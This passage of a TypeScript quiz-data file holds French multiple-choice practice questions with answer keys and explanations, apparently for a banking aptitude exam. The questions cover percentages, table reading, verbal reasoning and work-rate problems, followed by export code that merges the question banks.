      "Le prix final vaut 0,80 × 0,90 = 0,72 fois le prix initial. On paie donc 72 % du prix, ce qui représente une remise totale de 28 %.",
    pourquoiPas: {
      B: "30 % additionne les deux remises, alors que la seconde porte sur un prix déjà réduit.",
      C: "72 % est la proportion du prix effectivement payée, pas la remise.",
      D: "2 % multiplie les taux entre eux (0,20 × 0,10) au lieu des coefficients.",
    },
    aRetenir: "Remises successives : multipliez les coefficients (1 − r₁)(1 − r₂), puis retranchez de 1.",
  },
  {
    id: 'LOG-POU-006',
    section: 'logique',
    filiere: 'commune',
    competence: 'Pourcentages & intérêts',
    difficulte: 'moyen',
    enonce:
      "Dans un pays fictif, 1 zédor (ZD) vaut 2,5 korins (KR) et 1 KR vaut 40 UM. Combien d'UM obtient-on en échange de 30 ZD (sans frais) ?",
    options: [
      { id: 'A', texte: '480 UM' },
      { id: 'B', texte: '1 200 UM' },
      { id: 'C', texte: '75 UM' },
      { id: 'D', texte: '3 000 UM' },
    ],
    bonneReponse: 'D',
    explication:
      "On convertit d'abord en korins : 30 × 2,5 = 75 KR. Puis en UM : 75 × 40 = 3 000 UM. Le taux croisé est 1 ZD = 2,5 × 40 = 100 UM.",
    pourquoiPas: {
      A: "480 divise par 2,5 au lieu de multiplier (30 ÷ 2,5 × 40), ce qui inverse le premier taux.",
      B: "1 200 saute l'étape ZD → KR et applique directement le taux KR → UM aux zédors.",
      C: "75 est le montant en korins : la conversion s'est arrêtée à mi-chemin.",
    },
    aRetenir: "Pour un taux croisé, enchaînez les conversions en vérifiant que les unités s'annulent (ZD × KR/ZD × UM/KR = UM).",
  },
  {
    id: 'LOG-POU-007',
    section: 'logique',
    filiere: 'commune',
    competence: 'Pourcentages & intérêts',
    difficulte: 'difficile',
    enonce:
      "Un crédit est facturé au taux de 1 % par mois, avec capitalisation mensuelle. Quel est le taux annuel effectif, arrondi au dixième de point ?",
    options: [
      { id: 'A', texte: '12,0 %' },
      { id: 'B', texte: '12,7 %' },
      { id: 'C', texte: '12,6 %' },
      { id: 'D', texte: '112,7 %' },
    ],
    bonneReponse: 'B',
    explication:
      "Taux effectif = 1,01¹² − 1. Par développement : 1 + 12 × 0,01 + 66 × 0,0001 + 220 × 0,000001 ≈ 1,1268, soit 12,68 %. Arrondi au dixième : 12,7 %.",
    pourquoiPas: {
      A: "12,0 % est le taux proportionnel (12 × 1 %), qui ignore la capitalisation des intérêts.",
      C: "12,6 % tronque 12,68 % au lieu de l'arrondir au dixième le plus proche.",
      D: "112,7 % confond le coefficient multiplicateur (1,127) avec le taux d'intérêt.",
    },
    aRetenir: "Taux effectif annuel = (1 + taux mensuel)¹² − 1, toujours supérieur au taux proportionnel 12 × taux mensuel.",
  },

  // ───────────────────── Lecture de tableaux & graphiques ─────────────────────
  {
    id: 'LOG-TAB-001',
    section: 'logique',
    filiere: 'commune',
    competence: 'Lecture de tableaux & graphiques',
    difficulte: 'facile',
    enonce: "D'après le tableau, quel est le volume annuel total de transactions de la Banque Alpha ?",
    extrait: {
      langage: 'texte',
      contenu: `Volume de transactions (en milliers)
Banque        T1     T2     T3     T4
Alpha        120    150    135    165
Bêta          90     80    110    120
Gamma        200    210    190    230`,
    },
    options: [
      { id: 'A', texte: '435 milliers' },
      { id: 'B', texte: '585 milliers' },
      { id: 'C', texte: '570 milliers' },
      { id: 'D', texte: '142,5 milliers' },
    ],
    bonneReponse: 'C',
    explication:
      "On additionne la ligne Alpha : 120 + 150 + 135 + 165. En regroupant, (120 + 150) + (135 + 165) = 270 + 300 = 570 milliers.",
    pourquoiPas: {
      A: "435 oublie le troisième trimestre (135).",
      B: "585 compte 150 deux fois, à la place de la valeur du T3 (135).",
      D: "142,5 est la moyenne trimestrielle (570 ÷ 4), pas le total annuel.",
    },
    aRetenir: "Regroupez les nombres qui forment des sommes rondes pour additionner une ligne de tableau sans erreur.",
  },
  {
    id: 'LOG-TAB-002',
    section: 'logique',
    filiere: 'commune',
    competence: 'Lecture de tableaux & graphiques',
    difficulte: 'facile',
    enonce: "Quel guichet a traité le plus grand nombre d'opérations sur l'ensemble de la journée ?",
    extrait: {
      langage: 'texte',
      contenu: `Opérations traitées par guichet
Guichet    Matin    Après-midi
G1           42         38
G2           55         31
G3           47         49
G4           36         44`,
    },
    options: [
      { id: 'A', texte: 'G2' },
      { id: 'B', texte: 'G4' },
      { id: 'C', texte: 'G1' },
      { id: 'D', texte: 'G3' },
    ],
    bonneReponse: 'D',
    explication:
      "Totaux journaliers : G1 = 80, G2 = 86, G3 = 96, G4 = 80. G3 arrive en tête avec 96 opérations.",
    pourquoiPas: {
      A: "G2 a le meilleur matin (55), mais son total journalier (86) reste inférieur à celui de G3.",
      B: "G4 progresse le plus entre matin et après-midi (+8), mais son total n'est que de 80.",
      C: "G1 totalise 80 opérations, soit 16 de moins que G3.",
    },
    aRetenir: "Lisez précisément ce que demande la question (total, maximum partiel, progression) avant de parcourir le tableau.",
  },
  {
    id: 'LOG-TAB-003',
    section: 'logique',
    filiere: 'commune',
    competence: 'Lecture de tableaux & graphiques',
    difficulte: 'moyen',
    enonce: "Quelle part de l'encours total représentent ensemble l'agriculture et l'industrie ?",
    extrait: {
      langage: 'texte',
      contenu: `Encours de crédits par secteur (millions d'UM)
Secteur         Encours
Commerce          180
Agriculture        60
Industrie         120
Services          240
Total             600`,
    },
    options: [
      { id: 'A', texte: '30 %' },
      { id: 'B', texte: '20 %' },
      { id: 'C', texte: '10 %' },
      { id: 'D', texte: '75 %' },
    ],
    bonneReponse: 'A',
    explication:
      "Agriculture + industrie = 60 + 120 = 180 millions. Rapporté au total : 180 ÷ 600 = 0,30, soit 30 %.",
    pourquoiPas: {
      B: "20 % est la part de l'industrie seule (120 ÷ 600).",
      C: "10 % est la part de l'agriculture seule (60 ÷ 600).",
      D: "75 % rapporte 180 à l'encours des services (240) au lieu de l'encours total.",
    },
    aRetenir: "Une part se calcule toujours sur le total de référence : vérifiez le dénominateur avant de diviser.",
  },
  {
    id: 'LOG-TAB-004',
    section: 'logique',
    filiere: 'commune',
    competence: 'Lecture de tableaux & graphiques',
    difficulte: 'moyen',
    enonce:
      "Quel est le taux de croissance des dépôts de la Banque Delta entre 2022 et 2023, arrondi à l'unité ?",
    extrait: {
      langage: 'texte',
      contenu: `Dépôts de la Banque Delta (millions d'UM)
Année     Dépôts
2021        400
2022        460
2023        529
2024        600`,
    },
    options: [
      { id: 'A', texte: '13 %' },
      { id: 'B', texte: '15 %' },
      { id: 'C', texte: '69 %' },
      { id: 'D', texte: '32 %' },
    ],
    bonneReponse: 'B',
    explication:
      "Variation absolue : 529 − 460 = 69 millions. Taux = 69 ÷ 460 = 0,15, soit 15 % (vérification : 460 × 1,15 = 529).",
    pourquoiPas: {
      A: "13 % divise la variation par la valeur d'arrivée (69 ÷ 529) au lieu de la valeur de départ.",
      C: "69 est la variation absolue en millions, pas un pourcentage.",
      D: "32 % compare 2023 à 2021 (529 ÷ 400 − 1) au lieu de 2022.",
    },
    aRetenir: "Taux de variation = (valeur d'arrivée − valeur de départ) ÷ valeur de départ.",
  },
  {
    id: 'LOG-TAB-005',
    section: 'logique',
    filiere: 'commune',
    competence: 'Lecture de tableaux & graphiques',
    difficulte: 'moyen',
    enonce: "Quel est le nombre moyen de comptes ouverts par mois sur le semestre ?",
    extrait: {
      langage: 'texte',
      contenu: `Comptes ouverts par mois — Agence Centre
Mois       Jan   Fév   Mar   Avr   Mai   Juin
Comptes    130   110   150   140   120   190`,
    },
    options: [
      { id: 'A', texte: '135' },
      { id: 'B', texte: '150' },
      { id: 'C', texte: '120' },
      { id: 'D', texte: '140' },
    ],
    bonneReponse: 'D',
    explication:
      "Somme : 130 + 110 + 150 + 140 + 120 + 190 = 840. Moyenne : 840 ÷ 6 = 140 comptes par mois.",
    pourquoiPas: {
      A: "135 est la médiane (moyenne de 130 et 140 une fois les valeurs triées), pas la moyenne.",
      B: "150 est le milieu de l'étendue ((110 + 190) ÷ 2), qui ne tient compte que des extrêmes.",
      C: "120 divise la somme par 7 au lieu de 6 mois.",
    },
    aRetenir: "Moyenne, médiane et milieu de l'étendue sont trois indicateurs distincts : ne les confondez pas.",
  },
  {
    id: 'LOG-TAB-006',
    section: 'logique',
    filiere: 'commune',
    competence: 'Lecture de tableaux & graphiques',
    difficulte: 'difficile',
    enonce:
      "Entre T1 et T4 2024, quelle est la variation du volume de transactions de la Banque Alpha, arrondie au dixième ?",
    extrait: {
      langage: 'texte',
      contenu: `Marché des paiements électroniques
                             T1 2024    T4 2024
Marché total (milliers)        2 000      2 500
Part de la Banque Alpha         30 %       26 %
Part de la Banque Bêta          25 %       24 %`,
    },
    options: [
      { id: 'A', texte: '−4,0 %' },
      { id: 'B', texte: '−13,3 %' },
      { id: 'C', texte: '+8,3 %' },
      { id: 'D', texte: '+25,0 %' },
    ],
    bonneReponse: 'C',
    explication:
      "Volume d'Alpha au T1 : 30 % × 2 000 = 600 milliers ; au T4 : 26 % × 2 500 = 650 milliers. Variation : 50 ÷ 600 ≈ +8,3 %. La part baisse, mais le marché croît plus vite, donc le volume augmente.",
    pourquoiPas: {
      A: "−4,0 % confond la baisse de la part de marché (−4 points) avec la variation du volume.",
      B: "−13,3 % est la variation relative de la part (26 ÷ 30 − 1), pas celle du volume.",
      D: "+25,0 % est la croissance du marché total, pas celle de la Banque Alpha.",
    },
    aRetenir: "Volume = part × marché : une part qui baisse peut cacher un volume qui monte si le marché croît.",
  },
  {
    id: 'LOG-TAB-007',
    section: 'logique',
    filiere: 'commune',
    competence: 'Lecture de tableaux & graphiques',
    difficulte: 'difficile',
    enonce: "Quelle agence a enregistré le montant total de transactions le plus élevé ?",
    extrait: {
      langage: 'texte',
      contenu: `Activité mensuelle par agence
Agence    Nb de transactions    Montant moyen (UM)
Nord             1 200                 350
Sud                900                 480
Est              1 500                 270
Ouest              800                 520`,
    },
    options: [
      { id: 'A', texte: 'Sud' },
      { id: 'B', texte: 'Est' },
      { id: 'C', texte: 'Ouest' },
      { id: 'D', texte: 'Nord' },
    ],
    bonneReponse: 'A',
    explication:
      "Montant total = nombre × montant moyen. Nord : 420 000 ; Sud : 432 000 ; Est : 405 000 ; Ouest : 416 000 UM. Sud arrive en tête.",
    pourquoiPas: {
      B: "Est a le plus de transactions, mais leur faible montant moyen donne le plus petit total (405 000 UM).",
      C: "Ouest a le montant moyen le plus élevé, mais trop peu de transactions (416 000 UM au total).",
      D: "Nord totalise 420 000 UM, soit 12 000 UM de moins que Sud.",
    },
    aRetenir: "Un total se déduit du produit effectif × moyenne : ne jugez jamais sur une seule des deux colonnes.",
  },

  // ───────────────────────── Raisonnement verbal ─────────────────────────
  {
    id: 'LOG-VER-001',
    section: 'logique',
    filiere: 'commune',
    competence: 'Raisonnement verbal',
    difficulte: 'facile',
    enonce: "Complétez l'analogie : « Débit est à crédit ce que actif est à … »",
    options: [
      { id: 'A', texte: 'bilan' },
      { id: 'B', texte: 'passif' },
      { id: 'C', texte: 'capital' },
      { id: 'D', texte: 'charge' },
    ],
    bonneReponse: 'B',
    explication:
      "Débit et crédit sont les deux colonnes opposées d'un compte. De même, actif et passif sont les deux côtés opposés du bilan.",
    pourquoiPas: {
      A: "Le bilan est le document qui contient l'actif et le passif, pas l'opposé de l'actif.",
      C: "Le capital n'est qu'une composante du passif, pas son équivalent complet.",
      D: "Une charge relève du compte de résultat, elle s'oppose à un produit et non à l'actif.",
    },
    aRetenir: "Dans une analogie, identifiez d'abord la relation exacte (ici : opposition symétrique) avant de chercher le terme.",
  },
  {
    id: 'LOG-VER-002',
    section: 'logique',
    filiere: 'commune',
    competence: 'Raisonnement verbal',
    difficulte: 'facile',
    enonce: "Quel mot est l'intrus ?",
    options: [
      { id: 'A', texte: 'Virement' },
      { id: 'B', texte: 'Prélèvement' },
      { id: 'C', texte: 'Bilan' },
      { id: 'D', texte: 'Chèque' },
    ],
    bonneReponse: 'C',
    explication:
      "Virement, prélèvement et chèque sont trois moyens de paiement permettant de transférer des fonds. Le bilan est un document comptable de synthèse, sans rapport avec un paiement.",
    pourquoiPas: {
      A: "Le virement est un moyen de paiement, comme le prélèvement et le chèque.",
      B: "Le prélèvement est un moyen de paiement à l'initiative du créancier.",
      D: "Le chèque est un moyen de paiement scriptural, au même titre que le virement.",
    },
    aRetenir: "Pour trouver l'intrus, nommez la catégorie commune à la majorité des termes.",
  },
  {
    id: 'LOG-VER-003',
    section: 'logique',
    filiere: 'commune',
    competence: 'Raisonnement verbal',
    difficulte: 'moyen',
    enonce:
      "« Toute demande de crédit supérieure à 50 000 UM est examinée par le comité. Le comité ne se réunit que le jeudi. La demande de M. Kabeya, d'un montant de 80 000 UM, a été déposée un lundi. » D'après ce texte, quelle affirmation est nécessairement vraie ?",
    options: [
      { id: 'A', texte: "La demande de M. Kabeya sera acceptée." },
      { id: 'B', texte: "Elle sera examinée le jeudi de la même semaine." },
      { id: 'C', texte: "Les demandes de moins de 50 000 UM ne vont jamais en comité." },
      { id: 'D', texte: "La demande de M. Kabeya sera examinée un jeudi." },
    ],
    bonneReponse: 'D',
    explication:
      "80 000 UM dépasse 50 000 UM, donc la demande passe en comité. Comme le comité ne siège que le jeudi, l'examen aura lieu un jeudi, sans que le texte précise lequel.",
    pourquoiPas: {
      A: "Le texte parle d'examen, pas de décision : l'issue n'est pas connue.",
      B: "Rien n'indique de délai : le dossier peut être examiné un jeudi ultérieur.",
      C: "Le texte ne dit rien des petites demandes ; affirmer le contraire est une généralisation abusive.",
    },
    aRetenir: "« Nécessairement vrai » exclut toute information ajoutée : ne retenez que ce qui découle strictement du texte.",
  },
  {
    id: 'LOG-VER-004',
    section: 'logique',
    filiere: 'commune',
    competence: 'Raisonnement verbal',
    difficulte: 'moyen',
    enonce: "Dans le vocabulaire financier, que désigne la « solvabilité » d'une entreprise ?",
    options: [
      { id: 'A', texte: "Sa capacité à honorer l'ensemble de ses dettes grâce à ses actifs." },
      { id: 'B', texte: "Sa capacité à dégager un bénéfice sur ses ventes." },
      { id: 'C', texte: "Sa capacité à payer immédiatement ses échéances à court terme." },
      { id: 'D', texte: "Sa capacité à obtenir rapidement de nouveaux crédits." },
    ],
    bonneReponse: 'A',
    explication:
      "Une entreprise solvable possède assez d'actifs pour couvrir l'ensemble de ses engagements. La solvabilité se distingue de la liquidité, qui ne concerne que la trésorerie disponible à court terme.",
    pourquoiPas: {
      B: "Dégager un bénéfice relève de la rentabilité, notion différente.",
      C: "Faire face aux échéances immédiates définit la liquidité, pas la solvabilité.",
      D: "L'accès au crédit peut découler de la solvabilité, mais n'en est pas la définition.",
    },
    aRetenir: "Solvabilité = actifs couvrant toutes les dettes ; liquidité = trésorerie suffisante à court terme ; rentabilité = bénéfice.",
  },
  {
    id: 'LOG-VER-005',
    section: 'logique',
    filiere: 'commune',
    competence: 'Raisonnement verbal',
    difficulte: 'moyen',
    enonce: "Complétez l'analogie : « Prêteur est à créancier ce que emprunteur est à … »",
    options: [
      { id: 'A', texte: 'garant' },
      { id: 'B', texte: 'débiteur' },
      { id: 'C', texte: 'actionnaire' },
      { id: 'D', texte: 'bénéficiaire' },
    ],
    bonneReponse: 'B',
    explication:
      "Celui qui prête devient créancier : on lui doit de l'argent. Symétriquement, celui qui emprunte devient débiteur : il doit de l'argent.",
    pourquoiPas: {
      A: "Le garant s'engage à payer à la place de l'emprunteur défaillant ; c'est une tierce personne.",
      C: "L'actionnaire détient une part du capital, il n'a pas de dette envers la société.",
      D: "Bénéficiaire est trop vague : il désigne celui qui reçoit, sans notion de dette.",
    },
    aRetenir: "Créancier = celui à qui l'on doit ; débiteur = celui qui doit.",
  },
  {
    id: 'LOG-VER-006',
    section: 'logique',
    filiere: 'commune',
    competence: 'Raisonnement verbal',
    difficulte: 'difficile',
    enonce:
      "« Dans cette direction, tous les analystes maîtrisent SQL. Certains analystes maîtrisent aussi Python. Aucun agent qui maîtrise Python n'est affecté au guichet. » Quelle affirmation est nécessairement vraie ?",
    options: [
      { id: 'A', texte: "Certains analystes ne sont pas affectés au guichet." },
      { id: 'B', texte: "Aucun analyste n'est affecté au guichet." },
      { id: 'C', texte: "Tous les agents qui maîtrisent SQL sont analystes." },
      { id: 'D', texte: "Certains agents du guichet maîtrisent Python." },
    ],
    bonneReponse: 'A',
    explication:
      "Il existe des analystes qui maîtrisent Python. Or aucun agent maîtrisant Python n'est au guichet : ces analystes-là ne sont donc pas au guichet. On ne peut rien dire des autres analystes.",
    pourquoiPas: {
      B: "Seuls les analystes qui maîtrisent Python sont exclus du guichet ; les autres peuvent y être affectés.",
      C: "C'est la réciproque de « tous les analystes maîtrisent SQL », qui n'est pas garantie.",
      D: "Cela contredit directement la troisième phrase du texte.",
    },
    aRetenir: "« Certains » garantit l'existence d'au moins un élément : appliquez-lui les règles « aucun » et « tous » pour conclure.",
  },

  // ───────────────────────── Problèmes de rendement ─────────────────────────
  {
    id: 'LOG-REN-001',
    section: 'logique',
    filiere: 'commune',
    competence: 'Problèmes de rendement',
    difficulte: 'facile',
    enonce:
      "Un guichetier traite 12 opérations en 30 minutes. À ce rythme constant, combien en traite-t-il en 2 h 30 ?",
    options: [
      { id: 'A', texte: '72' },
      { id: 'B', texte: '30' },
      { id: 'C', texte: '48' },
      { id: 'D', texte: '60' },
    ],
    bonneReponse: 'D',
    explication:
      "2 h 30 représentent 150 minutes, soit 5 tranches de 30 minutes. Il traite donc 5 × 12 = 60 opérations.",
    pourquoiPas: {
      A: "72 compte 6 tranches de 30 minutes au lieu de 5.",
      B: "30 multiplie 12 par 2,5 en oubliant que 12 opérations correspondent à une demi-heure, pas à une heure.",
      C: "48 ne compte que les 2 heures et oublie la demi-heure restante.",
    },
    aRetenir: "Ramenez durées et quantités à une même unité (ici la demi-heure) avant d'appliquer la règle de trois.",
  },
  {
    id: 'LOG-REN-002',
    section: 'logique',
    filiere: 'commune',
    competence: 'Problèmes de rendement',
    difficulte: 'facile',
    enonce:
      "Une prime de 36 000 UM est partagée entre deux agences proportionnellement à 4 et à 5. Combien reçoit l'agence de coefficient 5 ?",
    options: [
      { id: 'A', texte: '16 000 UM' },
      { id: 'B', texte: '18 000 UM' },
      { id: 'C', texte: '20 000 UM' },
      { id: 'D', texte: '28 800 UM' },
    ],
    bonneReponse: 'C',
    explication:
      "Il y a 4 + 5 = 9 parts, donc une part vaut 36 000 ÷ 9 = 4 000 UM. L'agence de coefficient 5 reçoit 5 × 4 000 = 20 000 UM.",
    pourquoiPas: {
      A: "16 000 UM est la part de l'autre agence (coefficient 4).",
      B: "18 000 UM correspond à un partage égal, sans tenir compte des coefficients.",
      D: "28 800 UM applique le rapport 4/5 au total (36 000 × 4 ÷ 5), ce qui n'a pas de sens ici.",
    },
    aRetenir: "Partage proportionnel : divisez le total par la somme des coefficients, puis multipliez par chaque coefficient.",
  },
  {
    id: 'LOG-REN-003',
    section: 'logique',
    filiere: 'commune',
    competence: 'Problèmes de rendement',
    difficulte: 'moyen',
    enonce:
      "Le contrôleur A vérifie seul un lot de dossiers en 6 h ; le contrôleur B, seul, en 3 h. Combien de temps leur faut-il pour vérifier ce lot ensemble ?",
    options: [
      { id: 'A', texte: '2 h' },
      { id: 'B', texte: '4 h 30' },
      { id: 'C', texte: '9 h' },
      { id: 'D', texte: '1 h 30' },
    ],
    bonneReponse: 'A',
    explication:
      "En une heure, A fait 1/6 du lot et B en fait 1/3 = 2/6. Ensemble, ils font 3/6 = 1/2 lot par heure, donc il leur faut 2 h.",
    pourquoiPas: {
      B: "4 h 30 est la moyenne des deux durées, alors que travailler à deux doit aller plus vite que chacun seul.",
      C: "9 h additionne les durées au lieu d'additionner les vitesses de travail.",
      D: "1 h 30 suppose que les deux travaillent aussi vite que B, ce qui surestime l'apport de A.",
    },
    aRetenir: "En travail commun, on additionne les débits (1/tA + 1/tB), jamais les durées.",
  },
  {
    id: 'LOG-REN-004',
    section: 'logique',
    filiere: 'commune',
    competence: 'Problèmes de rendement',
    difficulte: 'moyen',
    enonce:
      "Un convoyeur de fonds fait l'aller à 60 km/h et le retour, sur la même distance, à 40 km/h. Quelle est sa vitesse moyenne sur l'aller-retour ?",
    options: [
      { id: 'A', texte: '50 km/h' },
      { id: 'B', texte: '24 km/h' },
      { id: 'C', texte: '20 km/h' },
      { id: 'D', texte: '48 km/h' },
    ],
    bonneReponse: 'D',
    explication:
      "Prenons 120 km par trajet : l'aller dure 2 h et le retour 3 h. Il parcourt 240 km en 5 h, soit 48 km/h (moyenne harmonique 2 × 60 × 40 ÷ 100).",
    pourquoiPas: {
      A: "50 km/h est la moyenne arithmétique des vitesses, qui ignore que le retour, plus lent, dure plus longtemps.",
      B: "24 km/h applique la formule 60 × 40 ÷ (60 + 40) en oubliant le facteur 2.",
      C: "20 km/h est l'écart entre les deux vitesses, sans signification ici.",
    },
    aRetenir: "Vitesse moyenne = distance totale ÷ temps total ; sur deux trajets égaux, c'est la moyenne harmonique 2v₁v₂ ÷ (v₁ + v₂).",
  },
  {
    id: 'LOG-REN-005',
    section: 'logique',
    filiere: 'commune',
    competence: 'Problèmes de rendement',
    difficulte: 'moyen',
    enonce:
      "Un père a aujourd'hui trois fois l'âge de son fils. Dans 12 ans, il aura le double de l'âge de son fils. Quel est l'âge actuel du fils ?",
    options: [
      { id: 'A', texte: '36 ans' },
      { id: 'B', texte: '12 ans' },
      { id: 'C', texte: '24 ans' },
      { id: 'D', texte: '48 ans' },
    ],
    bonneReponse: 'B',
    explication:
      "Soit x l'âge du fils : 3x + 12 = 2(x + 12), soit 3x + 12 = 2x + 24, donc x = 12. Vérification : 36 + 12 = 48 = 2 × (12 + 12).",
    pourquoiPas: {
      A: "36 ans est l'âge actuel du père, pas celui du fils.",
      C: "24 ans résulte de l'équation 3x = 2(x + 12), où l'on oublie de vieillir aussi le père de 12 ans.",
      D: "48 ans est l'âge du père dans 12 ans.",
    },
    aRetenir: "Dans un problème d'âges, ajoutez le même nombre d'années à chaque personne avant d'écrire l'équation.",
  },
  {
    id: 'LOG-REN-006',
    section: 'logique',
    filiere: 'commune',
    competence: 'Problèmes de rendement',
    difficulte: 'difficile',
    enonce:
      "Le serveur A traite seul un lot de transactions en 4 h ; le serveur B, seul, en 6 h. A démarre seul, puis B le rejoint au bout d'une heure. Quelle est la durée totale de traitement du lot ?",
    options: [
      { id: 'A', texte: '2 h 24 min' },
      { id: 'B', texte: '1 h 48 min' },
      { id: 'C', texte: '2 h 48 min' },
      { id: 'D', texte: '3 h 24 min' },
    ],
    bonneReponse: 'C',
    explication:
      "En 1 h, A traite 1/4 du lot ; il reste 3/4. Ensemble, le débit est 1/4 + 1/6 = 5/12 du lot par heure, d'où (3/4) ÷ (5/12) = 9/5 h = 1 h 48 min. Durée totale : 1 h + 1 h 48 min = 2 h 48 min.",
    pourquoiPas: {
      A: "2 h 24 min est la durée si A et B travaillaient ensemble dès le départ (12/5 h).",
      B: "1 h 48 min est seulement la phase commune : l'heure où A travaille seul a été oubliée.",
      D: "3 h 24 min ajoute 1 h à la durée du lot complet à deux, sans déduire le quart déjà traité par A.",
    },
    aRetenir: "Découpez le travail en phases : calculez ce qui est fait dans la première, puis traitez le reste au nouveau débit.",
  },
];

// ===========================================================================
// EXPORTS
// ===========================================================================

export const banqueTechniqueData: QcmQuestion[] = [...banqueDataA, ...banqueDataB];
export const banqueTechniqueCyber: QcmQuestion[] = [...banqueCyberA, ...banqueCyberB];
export const banqueCultureBcc: QcmQuestion[] = banqueBcc;
export const banqueAptitudesLogiques: QcmQuestion[] = banqueLogique;

/** Banque technique de chaque filière. */
export const banquesTechniques: Record<Filiere, QcmQuestion[]> = {
  data: banqueTechniqueData,
  cyber: banqueTechniqueCyber,
  bdd: banqueTechniqueBdd,
  systemes: banqueTechniqueSystemes,
  reseaux: banqueTechniqueReseaux,
  dev: banqueTechniqueDev,
  support: banqueTechniqueSupport,
  numerique: banqueTechniqueNumerique,
};

/** Toutes les questions, toutes banques confondues. */
export const quizData: QcmQuestion[] = [
  ...Object.values(banquesTechniques).flat(),
  ...banqueCultureBcc,
  ...banqueAptitudesLogiques,
];

const index = new Map(quizData.map((q) => [q.id, q]));

/** Retrouve une question par son id. */
export function questionParId(id: string): QcmQuestion | undefined {
  return index.get(id);
}
